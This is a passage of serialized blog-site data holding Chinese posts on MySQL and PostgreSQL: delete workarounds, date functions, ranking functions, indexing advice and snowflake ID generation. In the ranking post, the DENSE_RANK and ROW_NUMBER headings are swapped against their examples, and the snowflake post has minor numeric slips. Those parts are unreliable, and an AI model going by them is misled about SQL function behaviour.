update",date:"2022-04-18T00:00:34.000Z",permalink:"/pages/fbf4b4/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/03.mysql%20%E5%87%BA%E7%8E%B0You%20can_t%20specify%20target%20table%20for%20update%20.html",relativePath:"10.数据库/03.mysql 出现You can_t specify target table for update .md",key:"v-38088fc9",path:"/pages/fbf4b4/",headersStr:null,content:"这个sql语句在pgsql里面是可以正常运行的，但是在MYSQL里面会报错\n\nDELETE FROM person\nwhere id not in \n(\n\tSELECT min(id) as m_id FROM person GROUP BY email\n)\n\n\n1\n2\n3\n4\n5\n\n\n只需要给里面的这个查询结果再包装一层，就可以不报错了\n\nDELETE  FROM person\nwhere id not in \n(\n  SELECT * FROM \n\t(\n\t\tSELECT min(id) as m_id FROM person GROUP BY email\n\t) b\n)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n",normalizedContent:"这个sql语句在pgsql里面是可以正常运行的，但是在mysql里面会报错\n\ndelete from person\nwhere id not in \n(\n\tselect min(id) as m_id from person group by email\n)\n\n\n1\n2\n3\n4\n5\n\n\n只需要给里面的这个查询结果再包装一层，就可以不报错了\n\ndelete  from person\nwhere id not in \n(\n  select * from \n\t(\n\t\tselect min(id) as m_id from person group by email\n\t) b\n)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"MySQL 日期时间加减",frontmatter:{title:"MySQL 日期时间加减",date:"2022-04-18T00:00:34.000Z",permalink:"/pages/de640a/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/04.MySQL%20%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4%E5%8A%A0%E5%87%8F.html",relativePath:"10.数据库/04.MySQL 日期时间加减.md",key:"v-97fc02c6",path:"/pages/de640a/",headersStr:null,content:"# 1. 日期相关的函数\n\nnow (); 当前具体的日期和时间\n\ncurdate (); 当前日期\n\ncurtime(); 当前时间\n\n\n# 2. 加减某个时间间隔\n\n设置当前日期变量\n\nset @dt = now();\t//设置当前日期\nselect @dt;\t\t//查询变量值\n\n\n1\n2\n\n\n加减某个时间间隔函数date_add()与date_sub()\n\ndate_add('某个日期时间',interval 1 时间种类名);\n\n\n1\n\n\neg:\n\nselect date_add(@dt, interval 1 year);    //加1年\nselect date_add(@dt, interval 1 month);    //加1月\n\n\n1\n2\n\n\n> quarter:季， week:周， day:天， hour:小时， minute:分钟， second:秒， microsecond:毫秒\n\n> 注： 也可以不用变量，直接加减某个时间，如：select date_add('1998-01-01', interval 1 day);\n\n\n# 3. 日期相减\n\ndatediff(date1,date2) # 两个日期相减，date1减去date2得到相减之后的天数\ntimediff(time1,time2) # 两个时间相减 time1减time2，返回差值。\n\n\n1\n2\n\n\neg:\n\nselect timediff('2019-06-03 12:30:00', '2019-06-03 12:29:30');\n\n\n1\n",normalizedContent:"# 1. 日期相关的函数\n\nnow (); 当前具体的日期和时间\n\ncurdate (); 当前日期\n\ncurtime(); 当前时间\n\n\n# 2. 加减某个时间间隔\n\n设置当前日期变量\n\nset @dt = now();\t//设置当前日期\nselect @dt;\t\t//查询变量值\n\n\n1\n2\n\n\n加减某个时间间隔函数date_add()与date_sub()\n\ndate_add('某个日期时间',interval 1 时间种类名);\n\n\n1\n\n\neg:\n\nselect date_add(@dt, interval 1 year);    //加1年\nselect date_add(@dt, interval 1 month);    //加1月\n\n\n1\n2\n\n\n> quarter:季， week:周， day:天， hour:小时， minute:分钟， second:秒， microsecond:毫秒\n\n> 注： 也可以不用变量，直接加减某个时间，如：select date_add('1998-01-01', interval 1 day);\n\n\n# 3. 日期相减\n\ndatediff(date1,date2) # 两个日期相减，date1减去date2得到相减之后的天数\ntimediff(time1,time2) # 两个时间相减 time1减time2，返回差值。\n\n\n1\n2\n\n\neg:\n\nselect timediff('2019-06-03 12:30:00', '2019-06-03 12:29:30');\n\n\n1\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"PostgresSql 多表关联删除语句",frontmatter:{title:"PostgresSql 多表关联删除语句",date:"2022-04-18T00:00:34.000Z",permalink:"/pages/d22b53/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/05.PostgresSql%20%E5%A4%9A%E8%A1%A8%E5%85%B3%E8%81%94%E5%88%A0%E9%99%A4%E8%AF%AD%E5%8F%A5.html",relativePath:"10.数据库/05.PostgresSql 多表关联删除语句.md",key:"v-5b2bb0b6",path:"/pages/d22b53/",headersStr:null,content:"最近用PostgresSql数据库进行多表关联删除的操作，在写sql语句的时候遇到了问题：\n\nDELETE s.* FROM student s,classroom c WHERE s.cid = c.id AND s.sid = 1 DELETE FROM student s,classroom c WHERE s.cid = c.id AND s.sid = 1 上面两种写法操作后提示报错，下面是PostgresSql数据库对多表关联操作的正确用法，多张表之间用USING连接：\n\nDELETE FROM student s USING classroom c WHERE s.cid = c.id AND s.sid = 1\n\n\n1\n",normalizedContent:"最近用postgressql数据库进行多表关联删除的操作，在写sql语句的时候遇到了问题：\n\ndelete s.* from student s,classroom c where s.cid = c.id and s.sid = 1 delete from student s,classroom c where s.cid = c.id and s.sid = 1 上面两种写法操作后提示报错，下面是postgressql数据库对多表关联操作的正确用法，多张表之间用using连接：\n\ndelete from student s using classroom c where s.cid = c.id and s.sid = 1\n\n\n1\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"sql排名函数 RANK，DENSERANK和ROWNUMBER",frontmatter:{title:"sql排名函数 RANK，DENSE_RANK和ROW_NUMBER",date:"2022-04-18T00:00:34.000Z",permalink:"/pages/f233d5/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/06.sql%E6%8E%92%E5%90%8D%E5%87%BD%E6%95%B0%20RANK%EF%BC%8CDENSE_RANK%E5%92%8CROW_NUMBER.html",relativePath:"10.数据库/06.sql排名函数 RANK，DENSE_RANK和ROW_NUMBER.md",key:"v-4ffe176c",path:"/pages/f233d5/",headers:[{level:2,title:"1.1 区别RANK，DENSERANK和ROWNUMBER",slug:"_1-1-区别rank-dense-rank和row-number",normalizedTitle:"1.1 区别rank，denserank和rownumber",charIndex:null}],headersStr:"1.1 区别RANK，DENSERANK和ROWNUMBER",content:"# 1. 排名分类\n\n\n# 1.1 区别RANK，DENSE_RANK和ROW_NUMBER\n\n 1. RANK并列跳跃排名，并列即相同的值，相同的值保留重复名次，遇到下一个不同值时，跳跃到总共的排名。\n\n 2. DENSE_RANK并列连续排序，并列即相同的值，相同的值保留重复名次，遇到下一个不同值时，依然按照连续数字排名。\n\n 3. ROW_NUMBER连续排名，即使相同的值，依旧按照连续数字进行排名。\n\nEG:\n\n\n# 2. RANK()\n\n按照某字段的排序结果添加排名，但它是跳跃的、间断的排名，例如两个并列第一名后，下一个是第三名，1、1、3、4.\n\nSELECT Score,rank() over(ORDER BY Score desc) as 'Rank' FROM score;\n# 分组排序\nSELECT Score,rank() over(partition by xxx ORDER BY Score desc) as 'Rank' FROM score;\n\n\n1\n2\n3\n\n\n\n# 3. DENSE_RANK()\n\n它是将某字段按照顺序依次添加行号。如1、2、3、4\n\nSELECT Score,row_number() over(ORDER BY Score desc) as 'Rank' FROM score；\n# 分组排序\nSELECT Score,row_number() over(partition by xxx ORDER BY Score desc) as 'Rank' FROM score；\n\n\n1\n2\n3\n\n\n\n# 4. ROW_NUMBER()\n\ndense 英语中指“稠密的、密集的”。dense_rank()是的排序数字是连续的、不间断。当有相同的分数时，它们的排名结果是并列的，例如，1、2、2、3、4。\n\nSELECT Score,dense_rank() over(ORDER BY Score desc) as 'Rank' FROM score；\n# 分组排序\nSELECT Score,dense_rank() over(partition by xxx ORDER BY Score desc) as 'Rank' FROM score；\n\n\n1\n2\n3\n",normalizedContent:"# 1. 排名分类\n\n\n# 1.1 区别rank，dense_rank和row_number\n\n 1. rank并列跳跃排名，并列即相同的值，相同的值保留重复名次，遇到下一个不同值时，跳跃到总共的排名。\n\n 2. dense_rank并列连续排序，并列即相同的值，相同的值保留重复名次，遇到下一个不同值时，依然按照连续数字排名。\n\n 3. row_number连续排名，即使相同的值，依旧按照连续数字进行排名。\n\neg:\n\n\n# 2. rank()\n\n按照某字段的排序结果添加排名，但它是跳跃的、间断的排名，例如两个并列第一名后，下一个是第三名，1、1、3、4.\n\nselect score,rank() over(order by score desc) as 'rank' from score;\n# 分组排序\nselect score,rank() over(partition by xxx order by score desc) as 'rank' from score;\n\n\n1\n2\n3\n\n\n\n# 3. dense_rank()\n\n它是将某字段按照顺序依次添加行号。如1、2、3、4\n\nselect score,row_number() over(order by score desc) as 'rank' from score；\n# 分组排序\nselect score,row_number() over(partition by xxx order by score desc) as 'rank' from score；\n\n\n1\n2\n3\n\n\n\n# 4. row_number()\n\ndense 英语中指“稠密的、密集的”。dense_rank()是的排序数字是连续的、不间断。当有相同的分数时，它们的排名结果是并列的，例如，1、2、2、3、4。\n\nselect score,dense_rank() over(order by score desc) as 'rank' from score；\n# 分组排序\nselect score,dense_rank() over(partition by xxx order by score desc) as 'rank' from score；\n\n\n1\n2\n3\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"阿里开发规范解读：为啥禁用外键约束",frontmatter:{title:"阿里开发规范解读：为啥禁用外键约束",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/e03ec8/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/07.%E9%98%BF%E9%87%8C%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83%E8%A7%A3%E8%AF%BB%EF%BC%9A%E4%B8%BA%E5%95%A5%E7%A6%81%E7%94%A8%E5%A4%96%E9%94%AE%E7%BA%A6%E6%9D%9F.html",relativePath:"10.数据库/07.阿里开发规范解读：为啥禁用外键约束.md",key:"v-629b6c3c",path:"/pages/e03ec8/",headersStr:null,content:" 1. 插入数据需要检查外键在引用的表是否存在\n\n 2. 并发读取会将要更改的page pin起来外键会被频繁检查，导致一直被锁定 pinned page在全部schedule操作执行完毕前不会应用到数据库，过多并发排队会导致崩溃 从而导致实际写入的表也就是订单明细表的所有写操作未提交到DB而且崩溃\n\n 3. 由于外键约束的级连删除会导致在其他表引用该值的地方被一并删除导致删除操作的结果不可控\n\n4.如果依赖外键关联来实现数据的一致性校验会导致一旦需要迁移数据或升级DB软件时需要改写应用来使应用对数据进行校验还不如一开始就把数据校验交给应用完成（当表非常长的时候，Mysql升级HBASE为例）",normalizedContent:" 1. 插入数据需要检查外键在引用的表是否存在\n\n 2. 并发读取会将要更改的page pin起来外键会被频繁检查，导致一直被锁定 pinned page在全部schedule操作执行完毕前不会应用到数据库，过多并发排队会导致崩溃 从而导致实际写入的表也就是订单明细表的所有写操作未提交到db而且崩溃\n\n 3. 由于外键约束的级连删除会导致在其他表引用该值的地方被一并删除导致删除操作的结果不可控\n\n4.如果依赖外键关联来实现数据的一致性校验会导致一旦需要迁移数据或升级db软件时需要改写应用来使应用对数据进行校验还不如一开始就把数据校验交给应用完成（当表非常长的时候，mysql升级hbase为例）",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"创建索引的注意事项",frontmatter:{title:"创建索引的注意事项",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/6a8928/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/08.%E5%88%9B%E5%BB%BA%E7%B4%A2%E5%BC%95%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9.html",relativePath:"10.数据库/08.创建索引的注意事项.md",key:"v-3eddd399",path:"/pages/6a8928/",headersStr:null,content:"1.选择合适的字段创建索引：\n\n * 不为 NULL 的字段 ：索引字段的数据应该尽量不为 NULL，因为对于数据为 NULL 的字段，数据库较难优化。如果字段频繁被查询，但又避免不了为 NULL，建议使用 0,1,true,false 这样语义较为清晰的短值或短字符作为替代。\n * 被频繁查询的字段 ：我们创建索引的字段应该是查询操作非常频繁的字段。\n * 被作为条件查询的字段 ：被作为 WHERE 条件查询的字段，应该被考虑建立索引。\n * 频繁需要排序的字段 ：索引已经排序，这样查询可以利用索引的排序，加快排序查询时间。\n * 被经常频繁用于连接的字段 ：经常用于连接的字段可能是一些外键列，对于外键列并不一定要建立外键，只是说该列涉及到表与表的关系。对于频繁被连接查询的字段，可以考虑建立索引，提高多表连接查询的效率。\n\n2.被频繁更新的字段应该慎重建立索引。\n\n虽然索引能带来查询上的效率，但是维护索引的成本也是不小的。 如果一个字段不被经常查询，反而被经常修改，那么就更不应该在这种字段上建立索引了。\n\n3.尽可能的考虑建立联合索引而不是单列索引。\n\n因为索引是需要占用磁盘空间的，可以简单理解为每个索引都对应着一颗 B+树。如果一个表的字段过多，索引过多，那么当这个表的数据达到一个体量后，索引占用的空间也是很多的，且修改索引时，耗费的时间也是较多的。如果是联合索引，多个字段在一个索引上，那么将会节约很大磁盘空间，且修改数据的操作效率也会提升。\n\n4.注意避免冗余索引 。\n\n冗余索引指的是索引的功能相同，能够命中索引(a, b)就肯定能命中索引(a) ，那么索引(a)就是冗余索引。如（name,city ）和（name ）这两个索引就是冗余索引，能够命中前者的查询肯定是能够命中后者的 在大多数情况下，都应该尽量扩展已有的索引而不是创建新索引。\n\n5.考虑在字符串类型的字段上使用前缀索引代替普通索引。\n\n前缀索引仅限于字符串类型，较普通索引会占用更小的空间，所以可以考虑使用前缀索引带替普通索引。",normalizedContent:"1.选择合适的字段创建索引：\n\n * 不为 null 的字段 ：索引字段的数据应该尽量不为 null，因为对于数据为 null 的字段，数据库较难优化。如果字段频繁被查询，但又避免不了为 null，建议使用 0,1,true,false 这样语义较为清晰的短值或短字符作为替代。\n * 被频繁查询的字段 ：我们创建索引的字段应该是查询操作非常频繁的字段。\n * 被作为条件查询的字段 ：被作为 where 条件查询的字段，应该被考虑建立索引。\n * 频繁需要排序的字段 ：索引已经排序，这样查询可以利用索引的排序，加快排序查询时间。\n * 被经常频繁用于连接的字段 ：经常用于连接的字段可能是一些外键列，对于外键列并不一定要建立外键，只是说该列涉及到表与表的关系。对于频繁被连接查询的字段，可以考虑建立索引，提高多表连接查询的效率。\n\n2.被频繁更新的字段应该慎重建立索引。\n\n虽然索引能带来查询上的效率，但是维护索引的成本也是不小的。 如果一个字段不被经常查询，反而被经常修改，那么就更不应该在这种字段上建立索引了。\n\n3.尽可能的考虑建立联合索引而不是单列索引。\n\n因为索引是需要占用磁盘空间的，可以简单理解为每个索引都对应着一颗 b+树。如果一个表的字段过多，索引过多，那么当这个表的数据达到一个体量后，索引占用的空间也是很多的，且修改索引时，耗费的时间也是较多的。如果是联合索引，多个字段在一个索引上，那么将会节约很大磁盘空间，且修改数据的操作效率也会提升。\n\n4.注意避免冗余索引 。\n\n冗余索引指的是索引的功能相同，能够命中索引(a, b)就肯定能命中索引(a) ，那么索引(a)就是冗余索引。如（name,city ）和（name ）这两个索引就是冗余索引，能够命中前者的查询肯定是能够命中后者的 在大多数情况下，都应该尽量扩展已有的索引而不是创建新索引。\n\n5.考虑在字符串类型的字段上使用前缀索引代替普通索引。\n\n前缀索引仅限于字符串类型，较普通索引会占用更小的空间，所以可以考虑使用前缀索引带替普通索引。",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"非聚集索引一定回表查询吗(覆盖索引)",frontmatter:{title:"非聚集索引一定回表查询吗(覆盖索引)",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/f446eb/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/09.%E9%9D%9E%E8%81%9A%E9%9B%86%E7%B4%A2%E5%BC%95%E4%B8%80%E5%AE%9A%E5%9B%9E%E8%A1%A8%E6%9F%A5%E8%AF%A2%E5%90%97(%E8%A6%86%E7%9B%96%E7%B4%A2%E5%BC%95).html",relativePath:"10.数据库/09.非聚集索引一定回表查询吗(覆盖索引).md",key:"v-c2d63a00",path:"/pages/f446eb/",headersStr:null,content:"非聚集索引不一定回表查询。\n\n> 试想一种情况，用户准备使用 SQL 查询用户名，而用户名字段正好建立了索引。\n\n SELECT name FROM table WHERE name='guang19'; \n\n\n1\n\n\n1\n\n> 那么这个索引的 key 本身就是 name，查到对应的 name 直接返回就行了，无需回表查询。\n\n即使是 MYISAM 也是这样，虽然 MYISAM 的主键索引确实需要回表， 因为它的主键索引的叶子节点存放的是指针。但是如果 SQL 查的就是主键呢?\n\nSELECT id FROM table WHERE id=1; \n\n\n1\n\n\n1\n\n主键索引本身的 key 就是主键，查到返回就行了。这种情况就称之为覆盖索引了。",normalizedContent:"非聚集索引不一定回表查询。\n\n> 试想一种情况，用户准备使用 sql 查询用户名，而用户名字段正好建立了索引。\n\n select name from table where name='guang19'; \n\n\n1\n\n\n1\n\n> 那么这个索引的 key 本身就是 name，查到对应的 name 直接返回就行了，无需回表查询。\n\n即使是 myisam 也是这样，虽然 myisam 的主键索引确实需要回表， 因为它的主键索引的叶子节点存放的是指针。但是如果 sql 查的就是主键呢?\n\nselect id from table where id=1; \n\n\n1\n\n\n1\n\n主键索引本身的 key 就是主键，查到返回就行了。这种情况就称之为覆盖索引了。",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"分库分表后ID主键如何处理",frontmatter:{title:"分库分表后ID主键如何处理",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/ed01bf/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/10.%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%E5%90%8EID%E4%B8%BB%E9%94%AE%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86.html",relativePath:"10.数据库/10.分库分表后ID主键如何处理.md",key:"v-74a01732",path:"/pages/ed01bf/",headersStr:null,content:"# 数据库自增ID\n\n这个就是说你的系统里每次得到一个id，都是往一个库的一个表里插入一条没什么业务含义的数据，然后获取一个数据库自增的一个id。拿到这个id之后再往对应的分库分表里去写入。\n\n这个方案的好处就是方便简单，谁都会用；缺点就是单库生成自增id，要是高并发的话，就会有瓶颈的；如果你硬是要改进一下，那么就专门开一个服务出来，这个服务每次就拿到当前id最大值，然后自己递增几个id，一次性返回一批id，然后再把当前最大id值修改成递增几个id之后的一个值；但是无论怎么说都是基于单个数据库。\n\n适合的场景：你分库分表就俩原因，要不就是单库并发太高，要不就是单库数据量太大；除非是你并发不高，但是数据量太大导致的分库分表扩容，你可以用这个方案，因为可能每秒最高并发最多就几百，那么就走单独的一个库和表生成自增主键即可。\n\n并发很低，几百/s，但是数据量大，几十亿的数据，所以需要靠分库分表来存放海量的数据\n\n\n# UUID\n\n好处就是本地生成，不要基于数据库来了；不好之处就是，uuid太长了，作为主键性能太差了，不适合用于主键。\n\n适合的场景：如果你是要随机生成个什么文件名了，编号之类的，你可以用uuid，但是作为主键是不能用uuid的。\n\n\n# 获取系统时间戳\n\n这个就是获取当前时间即可，但是问题是，并发很高的时候，比如一秒并发几千，会有重复的情况，这个是肯定不合适的。基本就不用考虑了。\n\n适合的场景：一般如果用这个方案，是将当前时间跟很多其他的业务字段拼接起来，作为一个id，如果业务上你觉得可以接受，那么也是可以的。你可以将别的业务字段值跟当前时间拼接起来，组成一个全局唯一的编号，订单编号，时间戳 + 用户id + 业务含义编码\n\n\n# Snowflake算法（雪花算法）\n\ntwitter开源的分布式id生成算法，就是把一个64位的long型的id，1个bit是不用的，用其中的41 bit作为毫秒数，用10 bit作为工作机器id，12 bit作为序列号\n\n1 bit：不用，为啥呢？因为二进制里第一个bit为如果是1，那么都是负数，但是我们生成的id都是正数，所以第一个bit统一都是0\n\n41 bit：表示的是时间戳，单位是毫秒。41 bit可以表示的数字多达2^41 - 1，也就是可以标识2 ^ 41 - 1个毫秒值，换算成年就是表示69年的时间。\n\n10 bit：记录工作机器id，代表的是这个服务最多可以部署在2^10台机器上哪，也就是1024台机器。但是10 bit里5个bit代表机房id，5个bit代表机器id。意思就是最多代表2 ^ 5个机房（32个机房），每个机房里可以代表2 ^ 5个机器（32台机器）。\n\n12 bit：这个是用来记录同一个毫秒内产生的不同id，12 bit可以代表的最大正整数是2 ^ 12 - 1 = 4096，也就是说可以用这个12bit代表的数字来区分同一个毫秒内的4096个不同的id\n\n64位的long型的id，64位的long -> 二进制\n\n0 | 0001100 10100010 10111110 10001001 01011100 00 | 10001 | 1 1001 | 0000 00000000\n\n2018-01-01 10:00:00 -> 做了一些计算，再换算成一个二进制，41bit来放 -> 0001100 10100010 10111110 10001001\n\n机房id，17 -> 换算成一个二进制 -> 10001\n\n机器id，25 -> 换算成一个二进制 -> 11001\n\nsnowflake算法服务，会判断一下，当前这个请求是否是，机房17的机器25，在2175/11/7 12:12:14时间点发送过来的第一个请求，如果是第一个请求\n\n假设，在2175/11/7 12:12:14时间里，机房17的机器25，发送了第二条消息，snowflake算法服务，会发现说机房17的机器25，在2175/11/7 12:12:14时间里，在这一毫秒，之前已经生成过一个id了，此时如果你同一个机房，同一个机器，在同一个毫秒内，再次要求生成一个id，此时我只能把加1\n\n比如我们来观察上面的那个，就是一个典型的二进制的64位的id，换算成10进制就是910499571847892992。\n\n\n\n所以你自己利用这个工具类，自己搞一个服务，然后对每个机房的每个机器都初始化这么一个东西，刚开始这个机房的这个机器的序号就是0。然后每次接收到一个请求，说这个机房的这个机器要生成一个id，你就找到对应的Worker，生成。\n\n他这个算法生成的时候，会把当前毫秒放到41 bit中，然后5 bit是机房id，5 bit是机器id，接着就是判断上一次生成id的时间如果跟这次不一样，序号就自动从0开始；要是上次的时间跟现在还是在一个毫秒内，他就把seq累加1，就是自动生成一个毫秒的不同的序号。\n\n这个算法那，可以确保说每个机房每个机器每一毫秒，最多生成4096个不重复的id。\n\n利用这个snowflake算法，你可以开发自己公司的服务，甚至对于机房id和机器id，反正给你预留了5 bit + 5 bit，你换成别的有业务含义的东西也可以的。\n\n这个snowflake算法相对来说还是比较靠谱的，所以你要真是搞分布式id生成，如果是高并发啥的，那么用这个应该性能比较好，一般每秒几万并发的场景，也足够你用了。",normalizedContent:"# 数据库自增id\n\n这个就是说你的系统里每次得到一个id，都是往一个库的一个表里插入一条没什么业务含义的数据，然后获取一个数据库自增的一个id。拿到这个id之后再往对应的分库分表里去写入。\n\n这个方案的好处就是方便简单，谁都会用；缺点就是单库生成自增id，要是高并发的话，就会有瓶颈的；如果你硬是要改进一下，那么就专门开一个服务出来，这个服务每次就拿到当前id最大值，然后自己递增几个id，一次性返回一批id，然后再把当前最大id值修改成递增几个id之后的一个值；但是无论怎么说都是基于单个数据库。\n\n适合的场景：你分库分表就俩原因，要不就是单库并发太高，要不就是单库数据量太大；除非是你并发不高，但是数据量太大导致的分库分表扩容，你可以用这个方案，因为可能每秒最高并发最多就几百，那么就走单独的一个库和表生成自增主键即可。\n\n并发很低，几百/s，但是数据量大，几十亿的数据，所以需要靠分库分表来存放海量的数据\n\n\n# uuid\n\n好处就是本地生成，不要基于数据库来了；不好之处就是，uuid太长了，作为主键性能太差了，不适合用于主键。\n\n适合的场景：如果你是要随机生成个什么文件名了，编号之类的，你可以用uuid，但是作为主键是不能用uuid的。\n\n\n# 获取系统时间戳\n\n这个就是获取当前时间即可，但是问题是，并发很高的时候，比如一秒并发几千，会有重复的情况，这个是肯定不合适的。基本就不用考虑了。\n\n适合的场景：一般如果用这个方案，是将当前时间跟很多其他的业务字段拼接起来，作为一个id，如果业务上你觉得可以接受，那么也是可以的。你可以将别的业务字段值跟当前时间拼接起来，组成一个全局唯一的编号，订单编号，时间戳 + 用户id + 业务含义编码\n\n\n# snowflake算法（雪花算法）\n\ntwitter开源的分布式id生成算法，就是把一个64位的long型的id，1个bit是不用的，用其中的41 bit作为毫秒数，用10 bit作为工作机器id，12 bit作为序列号\n\n1 bit：不用，为啥呢？因为二进制里第一个bit为如果是1，那么都是负数，但是我们生成的id都是正数，所以第一个bit统一都是0\n\n41 bit：表示的是时间戳，单位是毫秒。41 bit可以表示的数字多达2^41 - 1，也就是可以标识2 ^ 41 - 1个毫秒值，换算成年就是表示69年的时间。\n\n10 bit：记录工作机器id，代表的是这个服务最多可以部署在2^10台机器上哪，也就是1024台机器。但是10 bit里5个bit代表机房id，5个bit代表机器id。意思就是最多代表2 ^ 5个机房（32个机房），每个机房里可以代表2 ^ 5个机器（32台机器）。\n\n12 bit：这个是用来记录同一个毫秒内产生的不同id，12 bit可以代表的最大正整数是2 ^ 12 - 1 = 4096，也就是说可以用这个12bit代表的数字来区分同一个毫秒内的4096个不同的id\n\n64位的long型的id，64位的long -> 二进制\n\n0 | 0001100 10100010 10111110 10001001 01011100 00 | 10001 | 1 1001 | 0000 00000000\n\n2018-01-01 10:00:00 -> 做了一些计算，再换算成一个二进制，41bit来放 -> 0001100 10100010 10111110 10001001\n\n机房id，17 -> 换算成一个二进制 -> 10001\n\n机器id，25 -> 换算成一个二进制 -> 11001\n\nsnowflake算法服务，会判断一下，当前这个请求是否是，机房17的机器25，在2175/11/7 12:12:14时间点发送过来的第一个请求，如果是第一个请求\n\n假设，在2175/11/7 12:12:14时间里，机房17的机器25，发送了第二条消息，snowflake算法服务，会发现说机房17的机器25，在2175/11/7 12:12:14时间里，在这一毫秒，之前已经生成过一个id了，此时如果你同一个机房，同一个机器，在同一个毫秒内，再次要求生成一个id，此时我只能把加1\n\n比如我们来观察上面的那个，就是一个典型的二进制的64位的id，换算成10进制就是910499571847892992。\n\n\n\n所以你自己利用这个工具类，自己搞一个服务，然后对每个机房的每个机器都初始化这么一个东西，刚开始这个机房的这个机器的序号就是0。然后每次接收到一个请求，说这个机房的这个机器要生成一个id，你就找到对应的worker，生成。\n\n他这个算法生成的时候，会把当前毫秒放到41 bit中，然后5 bit是机房id，5 bit是机器id，接着就是判断上一次生成id的时间如果跟这次不一样，序号就自动从0开始；要是上次的时间跟现在还是在一个毫秒内，他就把seq累加1，就是自动生成一个毫秒的不同的序号。\n\n这个算法那，可以确保说每个机房每个机器每一毫秒，最多生成4096个不重复的id。\n\n利用这个snowflake算法，你可以开发自己公司的服务，甚至对于机房id和机器id，反正给你预留了5 bit + 5 bit，你换成别的有业务含义的东西也可以的。\n\n这个snowflake算法相对来说还是比较靠谱的，所以你要真是搞分布式id生成，如果是高并发啥的，那么用这个应该性能比较好，一般每秒几万并发的场景，也足够你用了。",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"聚集索引与非聚集索引",frontmatter:{title:"聚集索引与非聚集索引",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/f17e43/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/11.%E8%81%9A%E9%9B%86%E7%B4%A2%E5%BC%95%E4%B8%8E%E9%9D%9E%E8%81%9A%E9%9B%86%E7%B4%A2%E5%BC%95.html",relativePath:"10.数据库/11.聚集索引与非聚集索引.md",key:"v-e8320b5a",path:"/pages/f17e43/",headers:[{level:2,title:"聚集索引的优点",slug:"聚集索引的优点",normalizedTitle:"聚集索引的优点",charIndex:144},{level:2,title:"聚集索引的缺点",slug:"聚集索引的缺点",normalizedTitle:"聚集索引的缺点",charIndex:223},{level:2,title:"非聚集索引的优点",slug:"非聚集索引的优点",normalizedTitle:"非聚集索引的优点",charIndex:633},{level:2,title:"非聚集索引的缺点",slug:"非聚集索引的缺点",normalizedTitle:"非聚集索引的缺点",charIndex:700}],headersStr:"聚集索引的优点 聚集索引的缺点 非聚集索引的优点 非聚集索引的缺点",content:"# 聚集索引\n\n聚集索引即索引结构和数据一起存放的索引。主键索引属于聚集索引。\n\n在 Mysql 中，InnoDB 引擎的表的 .ibd文件就包含了该表的索引和数据，对于 InnoDB 引擎表来说，该表的索引(B+树)的每个非叶子节点存储索引，叶子节点存储索引和索引对应的数据。\n\n\n# 聚集索引的优点\n\n聚集索引的查询速度非常的快，因为整个 B+树本身就是一颗多叉平衡树，叶子节点也都是有序的，定位到索引的节点，就相当于定位到了数据。\n\n\n# 聚集索引的缺点\n\n 1. 依赖于有序的数据 ：因为 B+树是多路平衡树，如果索引的数据不是有序的，那么就需要在插入时排序，如果数据是整型还好，否则类似于字符串或 UUID 这种又长又难比较的数据，插入或查找的速度肯定比较慢。\n 2. 更新代价大 ： 如果对索引列的数据被修改时，那么对应的索引也将会被修改， 而且况聚集索引的叶子节点还存放着数据，修改代价肯定是较大的， 所以对于主键索引来说，主键一般都是不可被修改的。\n\n\n# 非聚集索引\n\n非聚集索引即索引结构和数据分开存放的索引。\n\n二级索引属于非聚集索引。\n\n> MYISAM 引擎的表的.MYI 文件包含了表的索引， 该表的索引(B+树)的每个叶子非叶子节点存储索引， 叶子节点存储索引和索引对应数据的指针，指向.MYD 文件的数据。\n> \n> 非聚集索引的叶子节点并不一定存放数据的指针， 